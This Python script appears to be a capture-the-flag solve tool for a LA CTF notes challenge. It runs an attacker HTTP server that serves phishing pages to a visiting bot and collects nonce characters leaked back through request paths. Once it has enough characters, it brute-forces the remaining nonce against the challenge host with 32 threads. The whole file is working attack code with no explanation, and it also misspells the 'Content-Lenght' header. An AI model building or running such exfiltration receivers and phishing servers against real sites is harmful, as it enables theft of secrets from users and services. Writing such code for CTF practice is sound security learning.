from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

EVIL_ASCII = """
       
       fish caught the hook
                  
⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⡀⠀
⠀⠀⢀⣾⡟⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡙⣿⡄
⠀⠀⣸⣿⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣹⣿
⠀⠀⣿⣿⡆⢚⢄⣀⣠⠤⠒⠈⠁⠀⠀⠈⠉⠐⠢⢄⡀⣀⢞⠀⣾⣿
⠀⠀⠸⣿⣿⣅⠄⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠑⣄⣽⣿⡟
⠀⠀⠀⠘⢿⣿⣟⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣾⣿⣿⠏⠀
⠀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⢻⠀⠀
⠀⠀⠀⠀⢿⠀⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⢸⠀⠀
⠀⠀⠀⠀⢸⢰⡿⢘⣦⣤⣀⠑⢦⡀⠀⣠⠖⣁⣤⣴⡊⢸⡇⡼⠀⠀
⠀⠀⠀⠀⠀⠾⡅⣿⣿⣿⣿⣿⠌⠁⠀⠁⢺⣿⣿⣿⣿⠆⣇⠃⠀⠀
⠀⠀⠀⠀⠀⢀⠂⠘⢿⣿⣿⡿⠀⣰⣦⠀⠸⣿⣿⡿⠋⠈⢀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⢠⣿⢻⣆⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠓⠶⣶⣦⠤⠀⠘⠋⠘⠋⠀⠠⣴⣶⡶⠞⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⢹⣷⠦⢀⠤⡤⡆⡤⣶⣿⢸⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⡀⠘⢯⣳⢶⠦⣧⢷⢗⣫⠇⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡀⠈⠋⠛⠛⠋⠉⢀⡠⠒⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢦⠀⢀⣀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""


arr = []


def say_nothing(self):
    self.send_response(200)
    self.send_header("Content-Lenght", "0" )
    self.end_headers()
    self.wfile.write(b"200")


def do_phishing(self):
    with open("phishing.html","rb") as file:
        data = file.read()
        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.send_header("Content-Lenght", str(len(data)) )
        self.end_headers()
        self.wfile.write(data)

def do_phishing2(self):
    with open("phishing2.html","rb") as file:
        data = file.read()
        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.send_header("Content-Lenght", str(len(data)) )
        self.end_headers()
        self.wfile.write(data)

t0 = None
import datetime
import requests
import threading

def brute(nonce0,part):
    import Crypto.Util.number
    import os
    MAX = 8
    i = 0
    while i < MAX:
        

        if i >= MAX:
            i = i%MAX
        
        _hex = Crypto.Util.number.long_to_bytes(part*8+i).hex()
        _hex = _hex.rjust(2,"0")
        _hex = nonce0 + _hex
        # print(_hex)
        #_hex = os.urandom(4).hex()
        # print(_hex,end = "\r")
        resp = requests.get(f"https://notes.chall.lac.tf/guess?nonce={_hex}")
        # print(_hex, resp.text)
        if resp.text != "Incorrect":
            print(resp.text, _hex)
        i += 1

class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global arr
        global t0      

        if self.path == "/welcome_you_bot":
            print(EVIL_ASCII)      
            do_phishing(self)
            return
        
        if self.path == "/phishing2":
            print(EVIL_ASCII)      
            do_phishing2(self)
            return


        if self.path.startswith("/count"):
            arr.append(int(self.path.removeprefix("/count")))
            print(arr)
            say_nothing(self)
            return
        
        if self.path.startswith("/nonce_"):
            nonce = self.path.removeprefix("/nonce_")
            if len(nonce) == 1:
                t0 = datetime.datetime.now()
                print("t0",t0)
            if len(nonce)>1:
                
                print(nonce)
                print(datetime.datetime.now() - t0)
            if len(nonce) == 6:
                nonce0 = nonce
                for i in range(32):
                    thread = threading.Thread(target=brute, args=(nonce0,i), daemon=True)
                    thread.start()

            say_nothing(self)
            return


        secret_reset = "/reset_count_nsadknas"

        if self.path.startswith(secret_reset):
            arr = []
            say_nothing(self)
            return




        say_nothing(self)

	

    def do_POST(self):
        # read the content-length header
        content_length = int(self.headers.get("Content-Length"))
        # read that many bytes from the body of the request
        body = self.rfile.read(content_length)

        self.send_response(200)
        self.end_headers()
        
        print(body)
        # echo the body in the response
        self.wfile.write(b"ok")
        

if __name__ == "__main__":

    httpd = HTTPServer(('0.0.0.0', 9001), MyHandler)
    httpd.serve_forever()